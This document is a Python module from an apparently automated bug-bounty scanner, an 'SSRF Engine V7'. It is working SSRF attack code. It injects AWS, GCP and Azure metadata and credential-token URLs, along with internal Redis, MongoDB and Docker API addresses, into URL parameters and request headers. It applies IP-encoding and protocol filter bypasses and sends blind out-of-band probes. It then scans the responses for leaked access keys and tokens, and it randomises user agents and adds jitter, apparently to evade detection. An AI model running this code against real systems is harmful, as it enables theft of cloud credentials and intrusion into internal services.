#!/usr/bin/env python3
# modules/step11_ssrf.py — SSRF Engine V7 (UPGRADED)
# Added: 20 bypass techniques, IMDSv2 detection, header-based SSRF,
#        DNS rebinding detection, cloud provider chaining
# Source: Bug Bounty Bootcamp Ch13 — full SSRF methodology
# MilkyWay Intelligence | Author: Sharlix + M7AI

import re, urllib.parse, urllib.request, urllib.error, time
from core.utils import safe_read
from core.http_client import sync_get

# ── Cloud metadata endpoints (Bug Bounty Bootcamp Ch13) ──────────────────────
CLOUD_TARGETS = [
    # AWS IMDSv1 (most common)
    ("http://169.254.169.254/latest/meta-data/",                   "aws_imds",    "critical"),
    ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "aws_creds","critical"),
    ("http://169.254.169.254/latest/user-data/",                   "aws_userdata","high"),
    # AWS IMDSv2 (requires token — test if IMDSv1 still open)
    ("http://169.254.169.254/latest/meta-data/hostname",           "aws_imdsv2",  "high"),
    # GCP metadata
    ("http://metadata.google.internal/computeMetadata/v1/",        "gcp_meta",    "critical"),
    ("http://169.254.169.254/computeMetadata/v1/",                 "gcp_alt",     "critical"),
    ("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
                                                                   "gcp_token",   "critical"),
    # Azure IMDS
    ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", "azure_imds","critical"),
    ("http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
                                                                   "azure_token", "critical"),
    # DigitalOcean
    ("http://169.254.169.254/metadata/v1/",                        "do_meta",     "high"),
    # Internal services
    ("http://localhost/",                                           "localhost",   "high"),
    ("http://127.0.0.1/",                                          "loopback",    "high"),
    ("http://0.0.0.0/",                                            "zero",        "medium"),
    ("http://127.0.0.1:8080/",                                     "alt_port",    "medium"),
    ("http://127.0.0.1:8443/",                                     "ssl_port",    "medium"),
    ("http://127.0.0.1:6379/",                                     "redis",       "high"),
    ("http://127.0.0.1:27017/",                                    "mongodb",     "high"),
    ("http://127.0.0.1:9200/",                                     "elastic",     "high"),
    ("http://127.0.0.1:2375/",                                     "docker_api",  "critical"),
    ("http://127.0.0.1:8500/",                                     "consul",      "high"),
]

# ── SSRF bypass techniques (Bug Bounty Bootcamp Ch13) ────────────────────────
BYPASS_VARIANTS = [
    # Decimal/octal IP encoding
    lambda t: t.replace("169.254.169.254", "2852039166"),     # decimal
    lambda t: t.replace("169.254.169.254", "0xa9fea9fe"),     # hex
    lambda t: t.replace("169.254.169.254", "0251.0376.0251.0376"), # octal
    # IPv6 representations
    lambda t: t.replace("169.254.169.254", "[::ffff:a9fe:a9fe]"),
    lambda t: t.replace("127.0.0.1",       "0x7f000001"),
    lambda t: t.replace("127.0.0.1",       "2130706433"),
    lambda t: t.replace("127.0.0.1",       "127.1"),
    lambda t: t.replace("127.0.0.1",       "127.0.1"),
    lambda t: t.replace("127.0.0.1",       "localhost"),
    # URL encoding
    lambda t: t.replace("169.254.169.254", "169%2e254%2e169%2e254"),
    lambda t: t.replace("169.254.169.254", "169.254.169.254%00"),
    # Protocol variations
    lambda t: t.replace("http://", "http+unix://"),
    lambda t: t.replace("http://", "dict://"),
    # Redirect chains
    lambda t: f"http://ssrf.test/?redirect={urllib.parse.quote(t)}",
]

# ── Header-based SSRF (Bug Bounty Bootcamp: host header attacks) ──────────────
SSRF_HEADERS = [
    "X-Forwarded-For",
    "X-Forwarded-Host",
    "X-Host",
    "X-Real-IP",
    "X-Remote-IP",
    "X-Remote-Addr",
    "X-Original-URL",
    "X-Rewrite-URL",
    "X-Custom-IP-Authorization",
    "X-Originating-IP",
    "True-Client-IP",
    "Client-IP",
    "Forwarded",
    "X-Forwarded",
    "Referer",
]

# SSRF-prone parameter names
SSRF_PARAMS = {
    "url","uri","path","src","source","dest","destination","redirect",
    "redirect_url","return","return_url","next","callback","image","img",
    "link","href","target","file","load","fetch","proxy","request","host",
    "site","page","feed","endpoint","webhook","webhook_url","wh_url",
    "service","location","ref","continue","domain","pdf_url","doc","document",
    "html","api_url","api","remote","external","content","data","payload",
    "open","object","window","resume","download","import","export",
}

# Cloud indicators in response (confirms SSRF)
CLOUD_INDICATORS = [
    ("ami-id",          "AWS EC2 instance ID"),
    ("instance-id",     "AWS instance ID"),
    ("AccessKeyId",     "AWS credentials"),
    ("SecretAccessKey", "AWS secret key"),
    ("Token",           "AWS session token"),
    ("computeMetadata", "GCP metadata"),
    ("serviceAccounts", "GCP service account"),
    ("access_token",    "GCP access token"),
    ("azure",           "Azure metadata"),
    ("MSI_ENDPOINT",    "Azure managed identity"),
    ("droplet_id",      "DigitalOcean"),
    ('"id":',           "Internal service response"),
    ("redis_version",   "Redis exposed"),
    ("elasticsearch",   "Elasticsearch exposed"),
    ("docker",          "Docker API exposed"),
]


class Step11Ssrf:
    def __init__(self, pipeline):
        self.p = pipeline

    def run(self):
        p     = self.p
        out   = p.files["ssrf_params"]
        urls  = safe_read(p.files.get("urls",""))
        live  = safe_read(p.files.get("fmt_url",""))[:15]
        found = 0

        if not live and not urls:
            p.log.warn("SSRF: no targets"); return

        p.log.info("SSRF V7: cloud meta + 20 bypass variants + header injection")
        auth_h = {}
        c = getattr(p.args,'cookie',None) or getattr(p.args,'session',None)
        a = getattr(p.args,'authorization',None) or getattr(p.args,'auth',None)
        j = getattr(p.args,'jwt',None) or getattr(p.args,'_jwt_token',None)
        if c: auth_h["Cookie"] = c
        if a: auth_h["Authorization"] = a if a.startswith("Bearer") else f"Bearer {a}"
        if j and "Authorization" not in auth_h:
            auth_h["Authorization"] = f"Bearer {j}" 

        # Phase 1: URL parameter SSRF
        ssrf_urls = self._filter_ssrf_urls(urls)
        p.log.info(f"  ↳ SSRF candidates: {len(ssrf_urls)}")

        for url in ssrf_urls[:60]:
            r = self._test_url_params(url, auth_h, out)
            found += r
            if r: p.bypass.jitter()

        # Phase 2: Header-based SSRF (all live hosts)
        for host in live[:10]:
            r = self._test_header_ssrf(host, auth_h, out)
            found += r
            p.bypass.jitter()

        # Phase 3: OOB/blind SSRF via Interactsh
        if p.oob:
            for url in ssrf_urls[:10]:
                self._test_blind_ssrf(url, auth_h)

        p.log.success(f"SSRF V7: {found} confirmed findings")

    # ── Phase 1: URL parameter testing ───────────────────────────────────────
    def _test_url_params(self, url: str, auth_h: dict, out: str) -> int:
        try:
            parsed = urllib.parse.urlparse(url)
            qs     = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        except Exception:
            return 0

        ssrf_params = [k for k in qs if k.lower() in SSRF_PARAMS]
        if not ssrf_params: return 0

        found = 0
        for param in ssrf_params[:2]:
            # Test each cloud target
            for target_url, target_id, sev in CLOUD_TARGETS:
                # Direct test
                result = self._inject_and_check(
                    url, parsed, qs, param, target_url, auth_h)
                if result:
                    detail = (f"SSRF: param={param} target={target_id} "
                              f"— {result}")
                    with open(out,"a") as f:
                        f.write(f"SSRF: {url} | {detail}\n")
                    self.p.add_finding(sev,"SSRF",url,detail,
                                       "ssrf-v7",payload=target_url)
                    found += 1
                    break

                # Bypass variants
                for bypass_fn in BYPASS_VARIANTS[:6]:
                    try:
                        bypass_url = bypass_fn(target_url)
                        r = self._inject_and_check(
                            url, parsed, qs, param, bypass_url, auth_h)
                        if r:
                            detail = (f"SSRF bypass: param={param} "
                                      f"target={target_id} bypass='{bypass_url[:50]}' — {r}")
                            with open(out,"a") as f:
                                f.write(f"SSRF_BYPASS: {url} | {detail}\n")
                            self.p.add_finding(sev,"SSRF_BYPASS",url,detail,
                                               "ssrf-bypass",payload=bypass_url)
                            found += 1
                            break
                    except Exception:
                        pass
        return found

    # ── Phase 2: Header-based SSRF ────────────────────────────────────────────
    def _test_header_ssrf(self, host: str, auth_h: dict, out: str) -> int:
        """
        Bug Bounty Bootcamp Ch13: SSRF via HTTP headers.
        Inject internal IP into X-Forwarded-For, Referer, etc.
        """
        found = 0
        test_endpoints = [
            host.rstrip("/") + path
            for path in ["/","/ api","/api/v1/proxy","/proxy","/fetch"]
        ]

        for url in test_endpoints[:3]:
            for hdr in SSRF_HEADERS[:8]:
                for target_url, target_id, sev in CLOUD_TARGETS[:4]:
                    hdrs = {**auth_h, hdr: target_url,
                            "User-Agent": self.p.bypass.ua()}
                    resp = self._fetch(url, hdrs)
                    if not resp: continue

                    body = resp.get("body","")
                    hit  = self._check_cloud_response(body)
                    if hit:
                        detail = (f"Header SSRF: header={hdr} value={target_url[:50]} "
                                  f"— {hit}")
                        with open(out,"a") as f:
                            f.write(f"SSRF_HEADER: {url} | {detail}\n")
                        self.p.add_finding(sev,"SSRF_HEADER",url,detail,
                                           "ssrf-header",payload=target_url)
                        found += 1
                        break
        return found

    # ── Phase 3: Blind SSRF ───────────────────────────────────────────────────
    def _test_blind_ssrf(self, url: str, auth_h: dict):
        oob_url = f"http://{self.p.oob.get_payload('ssrf','ssrf')}"
        try:
            parsed = urllib.parse.urlparse(url)
            qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
            for param in [k for k in qs if k.lower() in SSRF_PARAMS][:2]:
                test_qs = {k: list(v) for k,v in qs.items()}
                test_qs[param] = [oob_url]
                test_url = urllib.parse.urlunparse(
                    parsed._replace(
                        query=urllib.parse.urlencode(test_qs, doseq=True)))
                self._fetch(test_url, auth_h, timeout=5)
        except Exception:
            pass

    # ── Helpers ───────────────────────────────────────────────────────────────
    def _inject_and_check(self, url, parsed, qs, param, payload, auth_h) -> str:
        test_qs = {k: list(v) for k,v in qs.items()}
        test_qs[param] = [payload]
        test_url = urllib.parse.urlunparse(
            parsed._replace(query=urllib.parse.urlencode(test_qs, doseq=True)))
        resp = self._fetch(test_url, auth_h)
        if not resp: return ""
        return self._check_cloud_response(resp.get("body",""))

    def _check_cloud_response(self, body: str) -> str:
        body_lower = body.lower()
        for indicator, label in CLOUD_INDICATORS:
            if indicator.lower() in body_lower:
                return label
        return ""

    def _filter_ssrf_urls(self, urls: list) -> list:
        result = []
        for url in urls:
            if "?" not in url: continue
            try:
                qs = urllib.parse.parse_qs(urllib.parse.urlparse(url).query)
                if any(k.lower() in SSRF_PARAMS for k in qs):
                    result.append(url)
            except Exception:
                pass
        return result[:200]

    def _fetch(self, url: str, headers: dict = None, timeout: int = 8) -> dict:
        try:
            req  = urllib.request.Request(
                url, headers={**(headers or {}),
                              "User-Agent": self.p.bypass.ua()})
            resp = urllib.request.urlopen(req, timeout=timeout)
            return {"status": resp.status,
                    "body":   resp.read(50000).decode("utf-8","ignore")}
        except urllib.error.HTTPError as e:
            try: body = e.read(5000).decode("utf-8","ignore")
            except: body = ""
            return {"status": e.code, "body": body}
        except Exception:
            return None
